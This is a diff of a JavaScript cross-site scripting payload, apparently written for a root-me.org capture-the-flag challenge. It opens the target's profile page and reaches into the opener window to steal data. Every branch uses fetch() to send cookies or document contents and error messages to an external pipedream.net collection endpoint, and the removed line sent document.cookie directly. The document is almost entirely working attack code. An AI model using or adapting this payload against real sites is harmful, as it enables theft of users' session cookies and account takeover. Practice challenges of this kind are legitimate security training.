@@ -15,7 +15,20 @@ try{
 
 try{
 	var aaa = open('http://challenge01.root-me.org:58003/profile', 'target');
-	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?c=' + aaa.opener.document.cookie, {mode: 'no-cors'})
+	var bb = aaa.opener
+	try{
+		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?c=' + bb, {mode: 'no-cors'});
+
+		try{
+			var cc = bb.document
+			fetch('https://en6gc9c8vfzvo.x.pipedream.net/?c=' + cc, {mode: 'no-cors'});
+		} catch (error) {
+	  		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr4='+error, {mode: 'no-cors'})
+		}
+	} catch (error) {
+  		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr3='+error, {mode: 'no-cors'})
+	}
+	
 } catch (error) {
   	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr2='+error, {mode: 'no-cors'})
 }
